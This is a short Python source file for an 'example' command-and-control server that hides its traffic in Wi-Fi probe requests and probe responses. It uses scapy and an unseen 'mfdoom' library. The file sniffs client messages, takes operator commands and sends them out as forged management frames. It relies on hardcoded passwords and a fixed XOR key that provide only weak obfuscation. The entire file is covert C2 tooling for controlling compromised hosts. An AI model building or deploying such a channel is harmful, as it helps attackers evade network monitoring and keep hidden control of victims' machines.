"""
c2 - Example C2 server that uses MF Doom as its communication vector

Author: Axel Persinger
License: MIT License
"""


"""
Imported Libraries

scapy - Networking/Packet library
argparse - Argument parsing library
golay - Golay Coding
mfdoom - Management Frame Doom project
"""
import scapy.layers
import scapy.layers.dot11
import scapy.sendrecv
import scapy.utils
import argparse
import golay
import mfdoom


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--iface', type=str, required=True, action='store', help="Interface to send/receive on")
    parser.add_argument('-d', '--dump', required=False, default=False, action='store_true', help="Take no input, just dump all messages from clients")
    args = parser.parse_args()

    # Sniff traffic, if a packet passes the lfilter (if it's a Probe Request), pass it to prn
    try:
        while True:
            sniffer = mfdoom.Sniffer()
            sniffer.password = b'Password123!@#'
            scapy.sendrecv.sniff(
                count=1,
                iface=args.iface, 
                lfilter=lambda pkt: (pkt.haslayer(scapy.layers.dot11.Dot11ProbeReq) and pkt.haslayer(scapy.layers.dot11.Dot11Elt) and pkt.type == 0 and pkt.subtype == 4 and mfdoom.extract_msg(pkt)),
                prn=sniffer.process_proberequest,
            )
            if not args.dump:
                cmd = input('< ').encode('utf-8')
                cmd = golay.encode(cmd)
                cmd = golay.xor(cmd, b'password')
                pkt = mfdoom.gen_proberesponse(cmd)
                scapy.sendrecv.send(pkt, iface=args.iface, verbose=False)
    
    except KeyboardInterrupt:
        print("[*] INFO: Keyboard Interrupt sent... Exiting...")
        return


if __name__ == '__main__':
    main()